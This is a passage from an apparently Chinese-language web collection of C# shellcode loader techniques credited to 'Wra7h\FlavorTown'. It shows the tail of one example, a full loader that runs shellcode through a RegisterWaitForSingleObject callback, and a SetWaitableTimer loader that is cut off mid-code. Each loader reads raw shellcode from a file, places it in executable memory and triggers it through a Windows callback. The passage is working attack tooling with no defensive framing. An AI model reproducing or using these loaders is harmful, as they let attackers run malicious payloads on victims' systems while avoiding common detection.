hljs-number">73</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"advapi32.dll"</span>)</span>]<br><span class="linenum hljs-number">74</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;<span class="hljs-title">PerfStopProvider</span>(<span class="hljs-params">IntPtr&nbsp;hProvider</span>)</span>;<br><span class="linenum hljs-number">75</span><br><span class="linenum hljs-number">76</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">struct</span>&nbsp;PERF_PROVIDER_CONTEXT<br><span class="linenum hljs-number">77</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">78</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;ContextSize;<br><span class="linenum hljs-number">79</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Reserved;<br><span class="linenum hljs-number">80</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;ControlCallback;<br><span class="linenum hljs-number">81</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;MemAllocRoutine;<br><span class="linenum hljs-number">82</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;MemFreeRoutine;<br><span class="linenum hljs-number">83</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;pMemContext;<br><span class="linenum hljs-number">84</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">85</span><br><span class="linenum hljs-number">86</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">87</span>}<br></code></pre>
<h1 id="h13cregisterwaitforsingleobject"><span>13.回调函数注入 (C#) 通过 RegisterWaitForSingleObject</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">RegisterWaitForSingleObject</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;RegisterWaitForSingleObject.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">21</span><br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;NewWaitObj&nbsp;=&nbsp;IntPtr.Zero;<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;WT_EXECUTEONLYONCE&nbsp;=&nbsp;<span class="hljs-number">0x8</span>;<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RegisterWaitForSingleObject(<span class="hljs-keyword">out</span>&nbsp;NewWaitObj,&nbsp;Process.GetCurrentProcess().Handle,&nbsp;hAlloc,&nbsp;IntPtr.Zero,&nbsp;<span class="hljs-number">0</span>,&nbsp;WT_EXECUTEONLYONCE);<br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sleep(<span class="hljs-number">1000</span>);<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">56</span><br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">RegisterWaitForSingleObject</span>(<span class="hljs-params"><br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;IntPtr&nbsp;phNewWaitObject,<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hObject,<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;Callback,<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;Context,<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;dwMilliseconds,<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;dwFlags</span>)</span>;<br><span class="linenum hljs-number">65</span><br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Sleep</span>(<span class="hljs-params"><span class="hljs-keyword">int</span>&nbsp;milliseconds</span>)</span>;<br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">69</span>}<br></code></pre>
<h1 id="h14csetwaitabletimer"><span>14.回调函数注入 (C#) 通过 SetWaitableTimer</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">SetWaitableTimer</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;SetWaitableTimer.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hTimer&nbsp;=&nbsp;CreateWaitableTimer(IntPtr.Zero,&nbsp;<span class="hljs-literal">false</span>,&nbsp;<span class="hljs-keyword">string</span>.Empty);<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;sLI&nbsp;=&nbsp;<span class="hljs-keyword">new</span>&nbsp;LARGE_INTEGER();<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SetWaitableTimer(hTimer,&nbsp;<span class="hljs-keyword">ref</span>&nbsp;sLI,&nbsp;<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;IntPtr.Zero,&nbsp;<span class="hljs-literal">false</span>);<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SleepEx(<span class="hljs-number">1000</span>,&nbsp;<span class="hljs-literal">true</span>);<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">53</span><br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span 